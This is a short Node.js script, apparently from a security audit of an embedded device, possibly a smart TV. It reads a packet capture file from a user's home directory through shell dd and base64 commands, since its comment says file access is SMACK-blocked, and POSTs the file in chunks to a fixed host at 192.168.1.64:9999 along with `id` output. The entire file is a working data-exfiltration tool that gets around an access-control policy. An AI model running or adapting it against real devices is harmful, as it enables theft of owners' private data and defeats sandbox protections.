"use strict";
// audit118.js - transfer pcap via shell dd|base64 (fs is SMACK-blocked).
var http = require("http");
var cp = require("child_process");
var HOST = "192.168.1.64";
var PORT = 9999;
var FILE = "/opt/usr/home/owner/acr_capture.pcap";
var CHUNK = 300000;

function post(path, body) {
    var data = JSON.stringify(body);
    var req = http.request({ host: HOST, port: PORT, path: path, method: "POST",
        headers: { "Content-Type": "application/json", "Content-Length": Buffer.byteLength(data) } },
        function (res) { try { res.resume(); } catch (e) {} });
    req.on("error", function () {});
    req.write(data);
    req.end();
}
function sh(cmd, cap) {
    try { return cp.execSync(cmd + " 2>&1", { encoding: "utf8", timeout: 30000 }).slice(0, cap || 500000); }
    catch (e) { return "ERR " + (e.stdout ? e.stdout : e.message); }
}

var out = {};
out.started = new Date().toISOString();
out.id = sh("id | head -c 80", 120);
out.size = sh("wc -c < " + FILE, 100);
post("/p118_test", out);

var totalSize = parseInt(trim(out.size));
var totalChunks = Math.ceil(totalSize / CHUNK);
post("/p118_start", { size: totalSize, chunks: totalChunks });

function trim(s) { return (s || "").trim(); }

var idx = 0;
function sendChunk() {
    if (idx >= totalChunks) {
        post("/p118_done", { chunks: idx, total: totalChunks });
        return;
    }
    var skip = idx * CHUNK;
    var b64 = sh("dd if=" + FILE + " bs=" + CHUNK + " skip=" + idx + " count=1 2>/dev/null | base64 -w 0", 500000);
    post("/p118_chunk", { i: idx, d: trim(b64) });
    idx++;
    setTimeout(sendChunk, 30);
}

sendChunk();
